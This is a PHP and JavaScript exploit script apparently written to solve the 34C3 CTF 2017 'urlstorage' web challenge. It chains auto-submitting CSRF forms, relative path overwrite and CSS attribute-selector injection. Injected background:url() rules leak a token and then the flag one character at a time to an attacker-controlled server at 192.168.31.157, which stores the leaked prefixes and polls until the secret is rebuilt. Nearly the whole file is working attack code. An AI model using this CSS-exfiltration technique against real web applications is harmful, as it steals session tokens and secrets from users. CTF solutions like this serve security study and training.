<?php

// http://blog.nsfocus.net/rpo-attack/
// https://www.cnblogs.com/iamstudy/articles/2017_34C4_web_urlstorage_writeup.html

error_reporting(0);

$target = 'http://34c3ctf2017.local.virzz.com/';
$exploit = 'http://192.168.31.157:8386/34c3ctf2017urlstorage.php';

if (isset($_GET['reset'])) {
	file_put_contents("t_prefix", "");
	file_put_contents("f_prefix", "");
	exit;
}

if (isset($_GET['t'])) {
	$p = explode("@", $_GET['t']);
	file_put_contents($p[0] . "_prefix", $p[1]);
	exit;
}

if (isset($_GET['l'])) {
	echo strlen(file_get_contents($_GET['l'] . "_prefix"));
	exit;
}

if (isset($_GET['g'])) {
	echo file_get_contents($_GET['g'] . "_prefix");
	exit;
}

function enc($s) {
	$res = '';
	for ($i = 0; $i < strlen($s); $i++) {
		$res .= '\\' . dechex(ord($s[$i]));
	}
	return $res;
}

$urlstorage_t = <<<END
<form method='POST' id='virink' target='_blank' action='{$target}urlstorage/virink'>
<input type="text" value="vvv" name="name" id="name">
<textarea name='url' id='url'>
\r\n\r\n\r\n#VVV#\r\n\r\n
</textarea>
</form>
<script>
    virink.submit();
</script>
END;

$getflag_t = <<<END
<form id="virink" action="{$target}flag" method="GET" target="_blank">
    <input value="#TOKEN#</title><base href=urlstorage/virink>" name="token">
</form>
<script>
    virink.submit();
</script>
END;

$doc = [
	"t" => $urlstorage_t,
	"f" => $getflag_t,
];

$template = [
	"t" => "a[href^=" . enc("flag?token=") . "#ENC#]{background:url($exploit?t=t@#PRE#);}\n",
	"f" => "input[value^=" . enc("34C3_") . "#ENC#]{background:url($exploit?t=f@#PRE#);}\n",
];

$prefix = [
	"t" => file_get_contents("t_prefix"),
	"f" => file_get_contents("f_prefix"),
];

function payload($css, $prefix) {
	$res = "";
	$alph = "0123456789abcdefghijklmnopqrstuvwxyz_";
	for ($i = 0; $i < 37; ++$i) {
		$chr = $alph[$i];
		$tmp = str_replace("#ENC#", enc("$prefix$chr"), $css);
		$tmp = str_replace("#PRE#", "$prefix$chr", $tmp);
		$res .= "$tmp\n";
	}
	return $res;
}

if (isset($_GET['token']) || isset($_GET['flag'])) {
	$_ = 't';
	$t = $doc[$_];
	if (isset($_GET['flag'])) {
		$_ = 'f';
		$t = str_replace("target='_blank' ", "", $t);
	}
	$t = str_replace("#VVV#", "{}\n" . payload($template[$_], $prefix[$_]), $t);
	echo $t;
	exit;
}

if (isset($_GET['getflag'])) {
	echo str_replace("#TOKEN#", $prefix['t'], $doc['f']);
	exit;
}

if (isset($_GET['saveflag'])) {
	$flag = "34C3_" . $prefix['f'];
	file_put_contents("34C3_flag.txt", $flag);
	unlink("t_prefix");
	unlink("f_prefix");
	exit($flag);
}

?>

<html>
    <head>
        <title>Exp</title>
    </head>
    <body>
        <div></div>
        <iframe id="urlstorage"></iframe>
        <iframe id="getflag"></iframe>
        <script>
            var t_len = 0;
            var f_len = 0;
            var poll_len = -1;
            var length = -1;
            function get(url) {
                var xhr = new XMLHttpRequest();
                xhr.open('GET', url, false);
                xhr.send();
                return xhr.responseText;
            }
            function get_token(){
                poll_len = parseInt(get('<?=$exploit?>?l=t'));
                if (poll_len === 32){
                    // get token finish and start to get flag
                    console.log("TOKEN: " + get('?g=t'));
                    length = -1;
                    get_flag();
                }else if(poll_len > length){
                    document.getElementById("urlstorage").src = '<?=$exploit?>?token';
                    length = poll_len;
                    console.log("Length now " + length);
                    setTimeout(get_token, 0);
                }else{
                    console.log("Length now " + length);
                    setTimeout(get_token, 100);
                }
            }
            function get_flag(){
                poll_len = parseInt(get('<?=$exploit?>?l=f'));
                if (poll_len === 40){
                    // get flag finish and save the flag
                    console.log("Flag: " + get('?g=f'));
                    length = -1;
                    get('<?=$exploit?>?FLAG='+get('<?=$exploit?>?saveflag'))
                }else if(poll_len > length){
                    document.getElementById("urlstorage").src = '<?=$exploit?>?flag';
                    setTimeout(function(){
                        document.getElementById("getflag").src = '<?=$exploit?>?getflag';
                        length = poll_len;
                        console.log("Length now " + length);
                        setTimeout(get_flag, 0);
                    }, 100);
                }else{
                    setTimeout(get_flag, 100);
                }
            }
            document.body.onload = function () {
                get('/start');
                console.log("Start to get Reset...");
                get('?reset=1');
                console.log("Start to get token...");
                get_token();
                // get_flag();
            }
        </script>
    </body>
</html>
